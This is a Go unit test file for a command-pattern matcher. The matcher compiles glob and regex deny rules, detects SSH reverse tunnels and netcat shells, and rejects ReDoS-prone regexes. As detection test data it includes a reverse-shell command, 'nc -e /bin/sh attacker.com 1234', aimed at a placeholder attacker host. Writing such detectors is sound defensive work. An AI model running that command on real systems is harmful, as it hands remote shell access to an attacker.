package policy

import (
	"strings"
	"testing"
)

func TestCompile_Empty(t *testing.T) {
	m, err := Compile(nil)
	if err != nil {
		t.Fatal(err)
	}
	if m.Len() != 0 {
		t.Fatalf("Len = %d", m.Len())
	}
	if m.Match("anything") != "" {
		t.Fatal("empty matcher should match nothing")
	}
}

func TestCompile_Glob(t *testing.T) {
	m, err := Compile([]string{"ssh *-R *", "nc *-e *"})
	if err != nil {
		t.Fatal(err)
	}
	if m.Len() != 2 {
		t.Fatalf("Len = %d", m.Len())
	}
	if got := m.Match("ssh -R 8080:localhost:80 user@host"); got != "ssh *-R *" {
		t.Fatalf("Match = %q", got)
	}
	if got := m.Match("nc -e /bin/sh attacker.com 1234"); got != "nc *-e *" {
		t.Fatalf("Match = %q", got)
	}
}

func TestCompile_Regex(t *testing.T) {
	m, err := Compile([]string{`re:^ssh\s+-R\s+`})
	if err != nil {
		t.Fatal(err)
	}
	if got := m.Match("ssh -R 8080 user@host"); got == "" {
		t.Fatal("regex should match")
	}
}

func TestCompile_EmptyPattern(t *testing.T) {
	_, err := Compile([]string{""})
	if err == nil {
		t.Fatal("empty pattern should error")
	}
}

func TestCompile_InvalidGlob(t *testing.T) {
	_, err := Compile([]string{"[unclosed"})
	if err == nil {
		t.Fatal("invalid glob should error")
	}
}

func TestCompile_ReDoS_Rejected(t *testing.T) {
	bad := []string{
		`re:(a+)+$`,
		`re:(a*)*$`,
		`re:(.*)+end`,
		`re:a{100,200}`,
		`re:a{4,50}`,
	}
	for _, p := range bad {
		_, err := Compile([]string{p})
		if err == nil {
			t.Errorf("ReDoS pattern %q should be rejected", p)
			continue
		}
		if !strings.Contains(err.Error(), "ReDoS") && !strings.Contains(err.Error(), "quantifier") {
			t.Errorf("ReDoS error message should mention ReDoS or quantifier, got: %v", err)
		}
	}
}

func TestCompile_ReDoS_AllowedBounded(t *testing.T) {
	ok := []string{
		`re:\d{1,3}`,
		`re:a{0,5}`,
		`re:b{3}`,
	}
	for _, p := range ok {
		_, err := Compile([]string{p})
		if err != nil {
			t.Errorf("Bounded pattern %q should be allowed, got: %v", p, err)
		}
	}
}

func TestMatcher_Match_GlobFieldMatch(t *testing.T) {
	m, err := Compile([]string{"*-R*"})
	if err != nil {
		t.Fatal(err)
	}
	if got := m.Match("ssh -R 8080"); got == "" {
		t.Fatal("glob should match per-field")
	}
}

func TestMatcher_MatchAll(t *testing.T) {
	m, err := Compile([]string{"ssh *", "*-R*"})
	if err != nil {
		t.Fatal(err)
	}
	hits := m.MatchAll("ssh -R 8080")
	if len(hits) != 2 {
		t.Fatalf("expected 2 hits, got %v", hits)
	}
}

func TestMatcher_Patterns(t *testing.T) {
	m, err := Compile([]string{"a", "b", "c"})
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(m.Patterns(), ","); got != "a,b,c" {
		t.Fatalf("Patterns = %q", got)
	}
}

func TestMatcher_NilSafe(t *testing.T) {
	var m *Matcher
	if m.Match("x") != "" {
		t.Fatal("nil matcher should not match")
	}
	if m.MatchAll("x") != nil {
		t.Fatal("nil matcher should not return hits")
	}
	if m.Len() != 0 {
		t.Fatal("nil matcher Len should be 0")
	}
	if m.Patterns() != nil {
		t.Fatal("nil matcher Patterns should be nil")
	}
}

func TestValidatePatterns(t *testing.T) {
	if err := ValidatePatterns([]string{"ok", "*-R*"}); err != nil {
		t.Fatal(err)
	}
	if err := ValidatePatterns([]string{"ok", "[bad"}); err == nil {
		t.Fatal("expected error for invalid glob")
	}
}

func TestMatchesGlob_FullLine(t *testing.T) {
	if !matchesGlob("ssh *", "ssh user@host") {
		t.Fatal("glob should match full line")
	}
	if matchesGlob("nope", "anything") {
		t.Fatal("glob should not match unrelated")
	}
}
